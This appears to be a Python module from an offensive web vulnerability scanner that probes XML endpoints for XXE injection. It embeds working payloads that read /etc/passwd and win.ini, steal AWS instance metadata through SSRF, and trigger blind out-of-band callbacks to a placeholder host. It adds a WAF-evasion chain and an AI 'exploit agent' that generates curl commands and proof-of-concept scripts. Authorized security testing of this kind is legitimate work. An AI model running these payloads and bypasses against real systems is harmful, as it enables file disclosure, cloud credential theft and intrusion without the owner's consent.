"""
cyberm4fia-scanner - XML External Entity (XXE) Scanner
Tests for XXE injection in XML-accepting endpoints
"""

from utils.colors import log_info, log_success, log_warning
from utils.request import smart_request
from utils.request import ScanExceptions

# ─────────────────────────────────────────────────────
# XXE Payloads
# ─────────────────────────────────────────────────────

# Classic XXE — file read
XXE_FILE_READ = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

XXE_FILE_READ_WIN = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>"""

# XXE — SSRF (internal network)
XXE_SSRF = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>"""

# XXE via parameter entity (blind)
XXE_BLIND = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{oob_host}/xxe-test">
  %xxe;
]>
<root><data>test</data></root>"""

# XXE via XInclude (no DOCTYPE control)
XXE_XINCLUDE = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>"""

# XXE via SVG upload
XXE_SVG = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>"""

# Signatures that confirm file read
LINUX_SIGNATURES = ["root:x:0:0", "bin/bash", "sbin/nologin", "/home/"]
WINDOWS_SIGNATURES = ["[fonts]", "[extensions]", "for 16-bit app support"]
AWS_SIGNATURES = ["ami-id", "instance-id", "local-ipv4"]

def detect_xml_endpoints(url, delay=0):
    """Discover endpoints that accept XML input."""
    xml_endpoints = []

    # Common XML-accepting paths
    xml_paths = [
        "/api/upload",
        "/api/import",
        "/api/xml",
        "/xmlrpc.php",
        "/soap",
        "/wsdl",
        "/api/v1/import",
        "/api/v2/import",
        "/api/parse",
        "/api/data",
        "/upload",
        "/import",
    ]

    # Check Content-Type acceptance
    test_xml = '<?xml version="1.0"?><test>1</test>'

    for path in xml_paths:
        try:
            test_url = url.rstrip("/") + path
            resp = smart_request(
                "post",
                test_url,
                data=test_xml,
                headers={"Content-Type": "application/xml"},
                delay=delay,
                timeout=5,
            )
            if resp.status_code not in (404, 405):
                xml_endpoints.append(
                    {
                        "url": test_url,
                        "status": resp.status_code,
                        "accepts_xml": "xml"
                        in resp.headers.get("content-type", "").lower(),
                    }
                )
        except ScanExceptions:
            pass

    # Also test the main URL
    try:
        resp = smart_request(
            "post",
            url,
            data=test_xml,
            headers={"Content-Type": "application/xml"},
            delay=delay,
            timeout=5,
        )
        if resp.status_code not in (404, 405):
            xml_endpoints.append(
                {
                    "url": url,
                    "status": resp.status_code,
                    "accepts_xml": True,
                }
            )
    except ScanExceptions:
        pass

    return xml_endpoints

def test_xxe_payload(url, payload, delay=0):
    """Send an XXE payload and analyze the response."""
    try:
        resp = smart_request(
            "post",
            url,
            data=payload,
            headers={
                "Content-Type": "application/xml",
                "Accept": "*/*",
            },
            delay=delay,
            timeout=10,
        )
        return resp.text, resp.status_code
    except ScanExceptions:
        return None, None

def scan_xxe(url, delay=0):
    """Main XXE scanner entry point."""
    log_info(f"Starting XXE scan on {url}")
    findings = []

    # Step 1: Discover XML endpoints
    xml_endpoints = detect_xml_endpoints(url, delay)
    if not xml_endpoints:
        log_info("No XML-accepting endpoints discovered.")
        # Still try main URL with XXE
        xml_endpoints = [{"url": url, "status": 0, "accepts_xml": False}]

    for ep in xml_endpoints:
        ep_url = ep["url"]
        log_info(f"Testing XXE on: {ep_url}")

        # Test 1: Linux file read
        body, status = test_xxe_payload(ep_url, XXE_FILE_READ, delay)
        if body:
            for sig in LINUX_SIGNATURES:
                if sig in body:
                    findings.append(
                        {
                            "type": "XXE",
                            "url": ep_url,
                            "payload": "file:///etc/passwd",
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE File Read confirmed at {ep_url}. "
                                f"/etc/passwd content leaked."
                            ),
                        }
                    )
                    log_success(f"[CRITICAL] XXE File Read: {ep_url}")
                    break

        # Test 2: Windows file read
        body, status = test_xxe_payload(ep_url, XXE_FILE_READ_WIN, delay)
        if body:
            for sig in WINDOWS_SIGNATURES:
                if sig.lower() in body.lower():
                    findings.append(
                        {
                            "type": "XXE",
                            "url": ep_url,
                            "payload": "file:///c:/windows/win.ini",
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE File Read (Windows) confirmed at {ep_url}."
                            ),
                        }
                    )
                    log_success(f"[CRITICAL] XXE Windows File Read: {ep_url}")
                    break

        # Test 3: SSRF via XXE (AWS metadata)
        body, status = test_xxe_payload(ep_url, XXE_SSRF, delay)
        if body:
            for sig in AWS_SIGNATURES:
                if sig in body:
                    findings.append(
                        {
                            "type": "XXE-SSRF",
                            "url": ep_url,
                            "payload": "http://169.254.169.254/...",
                            "evidence": f"AWS metadata leaked: '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE-SSRF confirmed at {ep_url}. "
                                f"AWS instance metadata accessible."
                            ),
                        }
                    )
                    log_success(f"[CRITICAL] XXE-SSRF AWS Metadata: {ep_url}")
                    break

        # Test 4: XInclude
        body, status = test_xxe_payload(ep_url, XXE_XINCLUDE, delay)
        if body:
            for sig in LINUX_SIGNATURES:
                if sig in body:
                    findings.append(
                        {
                            "type": "XXE-XInclude",
                            "url": ep_url,
                            "payload": "xi:include file:///etc/passwd",
                            "evidence": f"XInclude file read: '{sig}'",
                            "severity": "CRITICAL",
                            "description": f"XInclude injection at {ep_url}.",
                        }
                    )
                    log_success(f"[CRITICAL] XInclude injection: {ep_url}")
                    break

        # Check for XML parsing error messages (potential blind XXE)
        if body and any(
            err in body.lower()
            for err in [
                "xml parsing error",
                "xmlsyntaxerror",
                "premature end",
                "entity",
                "dtd",
                "doctype",
                "xerces",
                "sax",
            ]
        ):
            findings.append(
                {
                    "type": "XXE-Potential",
                    "url": ep_url,
                    "severity": "MEDIUM",
                    "evidence": "XML parser error messages detected",
                    "description": (
                        f"XML parser error messages at {ep_url}. "
                        f"Blind XXE may be possible with OOB techniques."
                    ),
                }
            )
            log_warning(f"[MEDIUM] XML parser errors at: {ep_url}")

    # ── 3-tier WAF bypass chain (AI evolution + protocol evasion) ──
    # Conservative fallback before delegating to ai_exploit_agent: only fires
    # when the main scan triggered a specific-WAF fingerprint. Tier 1
    # (auto-tamper) is disabled here because TamperChain operates on
    # SQL/XSS-shaped tokens — applying it to a multi-line XML body with
    # DOCTYPE and ENTITY declarations corrupts the document before it
    # reaches the parser.
    if not findings and xml_endpoints:
        bypass_finding = _run_waf_bypass_chain_for_xxe(xml_endpoints, delay)
        if bypass_finding:
            findings.append(bypass_finding)

    # ── AI Exploit Agent (Final Escalation) ──
    if not findings and xml_endpoints:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for ep in xml_endpoints[:3]:
                    ctx = ExploitContext(
                        url=ep["url"],
                        vuln_type="XXE",
                        waf=waf_name,
                        http_method="POST",
                        content_type="application/xml",
                    )
                    result = agent.exploit_xxe(ctx)
                    if result and result.success:
                        findings.append({
                            "type": "XXE",
                            "url": ep["url"],
                            "payload": result.payload,
                            "evidence": result.evidence[:200],
                            "severity": "CRITICAL",
                            "description": (
                                f"AI-discovered XXE at {ep['url']}. "
                                f"Confidence: {result.confidence:.0f}%"
                            ),
                            "source": f"AI Agent (Gen-{result.iteration})",
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        log_success(
                            f"[CRITICAL] XXE at: {ep['url']} "
                            f"[AI Agent Gen-{result.iteration}]"
                        )
                        break
        except ImportError:
            pass

    log_success(f"XXE scan complete. Found {len(findings)} issue(s).")
    return findings


def _run_waf_bypass_chain_for_xxe(xml_endpoints, delay):
    """3-tier WAF bypass for XXE (Tier 1 disabled — XML body would break).

    Iterates the first 3 XML-accepting endpoints, attempting three
    representative XXE payload kinds (Linux file read, Windows file read,
    AWS metadata SSRF). Returns the first finding or None.

    Activates only when ``waf_detector.detected_waf`` is non-empty.
    """
    from utils.waf import waf_detector

    waf_name = getattr(waf_detector, "detected_waf", "") or ""
    if not waf_name:
        return None

    from utils.waf_evasion import apply_waf_bypass_chain

    # (xml_body, kind_label, signature_list, payload_label)
    seed_set = (
        (XXE_FILE_READ, "linux-file-read", LINUX_SIGNATURES, "file:///etc/passwd"),
        (
            XXE_FILE_READ_WIN,
            "windows-file-read",
            WINDOWS_SIGNATURES,
            "file:///c:/windows/win.ini",
        ),
        (XXE_SSRF, "aws-metadata-ssrf", AWS_SIGNATURES, "http://169.254.169.254/..."),
    )

    log_info(f"⚡ XXE: 2-tier WAF bypass attempt against {waf_name}")

    for ep in xml_endpoints[:3]:
        ep_url = ep["url"]
        for body_payload, kind, sigs, payload_label in seed_set:
            case_is_windows = kind == "windows-file-read"

            def request_fn(p, *, evasion_level=0):
                try:
                    return smart_request(
                        "post",
                        ep_url,
                        data=p,
                        headers={
                            "Content-Type": "application/xml",
                            "Accept": "*/*",
                        },
                        delay=delay,
                        timeout=10,
                        evasion_level=evasion_level,
                    )
                except ScanExceptions:
                    return None

            def check_fn(response, p, source):
                if response is None:
                    return None
                body = getattr(response, "text", "") or ""
                if not body:
                    return None
                # Windows .ini signatures use bracketed section names — match
                # case-insensitively to tolerate response casing changes.
                haystack = body.lower() if case_is_windows else body
                for sig in sigs:
                    needle = sig.lower() if case_is_windows else sig
                    if needle in haystack:
                        log_success(
                            f"[CRITICAL] XXE via WAF bypass at {ep_url} "
                            f"({source})"
                        )
                        return {
                            "type": "XXE",
                            "kind": kind,
                            "url": ep_url,
                            "payload": payload_label,
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE confirmed at {ep_url} via WAF bypass "
                                f"chain ({source}). WAF: {waf_name}"
                            ),
                            "source": f"WAF Bypass Chain ({source})",
                            "waf": waf_name,
                        }
                return None

            seed_resp = request_fn(body_payload)
            if seed_resp is None:
                continue

            finding = apply_waf_bypass_chain(
                payload=body_payload,
                blocked_response=seed_resp,
                request_fn=request_fn,
                check_fn=check_fn,
                waf_name=waf_name,
                vuln_label="XXE",
                # XML body must reach the parser intact — auto-tamper would
                # rewrite control chars and break the DOCTYPE/ENTITY decls.
                enable_tamper=False,
            )
            if finding:
                return finding
    return None


# ── Async version ─────────────────────────────────────────────────────────

async def async_scan_xxe(url, delay=0):
    """Async version of scan_xxe — uses async HTTP for non-blocking I/O."""
    import asyncio
    from utils.async_request import async_smart_request, get_async_client

    log_info(f"Starting XXE scan (async) on {url}")
    findings = []

    async with get_async_client() as client:

        async def _test_payload(ep_url, payload):
            try:
                resp = await async_smart_request(
                    client, "post", ep_url,
                    data=payload,
                    headers={"Content-Type": "application/xml", "Accept": "*/*"},
                    delay=delay, timeout=10,
                )
                return resp.text, resp.status_code
            except ScanExceptions:
                return None, None

        async def _detect_endpoints():
            xml_endpoints = []
            test_xml = '<?xml version="1.0"?><test>1</test>'
            xml_paths = [
                "/api/upload", "/api/import", "/api/xml", "/xmlrpc.php",
                "/soap", "/wsdl", "/api/v1/import", "/api/v2/import",
                "/api/parse", "/api/data", "/upload", "/import",
            ]

            async def _check(path):
                try:
                    test_url = url.rstrip("/") + path
                    resp = await async_smart_request(
                        client, "post", test_url,
                        data=test_xml,
                        headers={"Content-Type": "application/xml"},
                        delay=delay, timeout=5,
                    )
                    if resp.status_code not in (404, 405):
                        return {
                            "url": test_url,
                            "status": resp.status_code,
                            "accepts_xml": "xml" in resp.headers.get("content-type", "").lower(),
                        }
                except ScanExceptions:
                    pass
                return None

            results = await asyncio.gather(*[_check(p) for p in xml_paths], return_exceptions=True)
            for r in results:
                if isinstance(r, dict):
                    xml_endpoints.append(r)

            # Also test main URL
            try:
                resp = await async_smart_request(
                    client, "post", url,
                    data=test_xml,
                    headers={"Content-Type": "application/xml"},
                    delay=delay, timeout=5,
                )
                if resp.status_code not in (404, 405):
                    xml_endpoints.append({"url": url, "status": resp.status_code, "accepts_xml": True})
            except ScanExceptions:
                pass

            return xml_endpoints

        xml_endpoints = await _detect_endpoints()
        if not xml_endpoints:
            log_info("No XML-accepting endpoints discovered.")
            xml_endpoints = [{"url": url, "status": 0, "accepts_xml": False}]

        for ep in xml_endpoints:
            ep_url = ep["url"]
            log_info(f"Testing XXE on: {ep_url}")

            # Test Linux file read
            body, status = await _test_payload(ep_url, XXE_FILE_READ)
            if body:
                for sig in LINUX_SIGNATURES:
                    if sig in body:
                        findings.append({
                            "type": "XXE", "url": ep_url,
                            "payload": "file:///etc/passwd",
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": f"XXE File Read confirmed at {ep_url}. /etc/passwd content leaked.",
                        })
                        log_success(f"[CRITICAL] XXE File Read: {ep_url}")
                        break

            # Test Windows file read
            body, status = await _test_payload(ep_url, XXE_FILE_READ_WIN)
            if body:
                for sig in WINDOWS_SIGNATURES:
                    if sig.lower() in body.lower():
                        findings.append({
                            "type": "XXE", "url": ep_url,
                            "payload": "file:///c:/windows/win.ini",
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": f"XXE File Read (Windows) confirmed at {ep_url}.",
                        })
                        log_success(f"[CRITICAL] XXE Windows File Read: {ep_url}")
                        break

            # Test SSRF via XXE
            body, status = await _test_payload(ep_url, XXE_SSRF)
            if body:
                for sig in AWS_SIGNATURES:
                    if sig in body:
                        findings.append({
                            "type": "XXE-SSRF", "url": ep_url,
                            "payload": "http://169.254.169.254/...",
                            "evidence": f"AWS metadata leaked: '{sig}'",
                            "severity": "CRITICAL",
                            "description": f"XXE-SSRF confirmed at {ep_url}. AWS instance metadata accessible.",
                        })
                        log_success(f"[CRITICAL] XXE-SSRF AWS Metadata: {ep_url}")
                        break

            # Test XInclude
            body, status = await _test_payload(ep_url, XXE_XINCLUDE)
            if body:
                for sig in LINUX_SIGNATURES:
                    if sig in body:
                        findings.append({
                            "type": "XXE-XInclude", "url": ep_url,
                            "payload": "xi:include file:///etc/passwd",
                            "evidence": f"XInclude file read: '{sig}'",
                            "severity": "CRITICAL",
                            "description": f"XInclude injection at {ep_url}.",
                        })
                        log_success(f"[CRITICAL] XInclude injection: {ep_url}")
                        break

            # Check for XML parser errors
            if body and any(
                err in body.lower()
                for err in ["xml parsing error", "xmlsyntaxerror", "premature end",
                            "entity", "dtd", "doctype", "xerces", "sax"]
            ):
                findings.append({
                    "type": "XXE-Potential", "url": ep_url,
                    "severity": "MEDIUM",
                    "evidence": "XML parser error messages detected",
                    "description": f"XML parser error messages at {ep_url}. Blind XXE may be possible.",
                })
                log_warning(f"[MEDIUM] XML parser errors at: {ep_url}")

    log_success(f"XXE scan (async) complete. Found {len(findings)} issue(s).")
    return findings
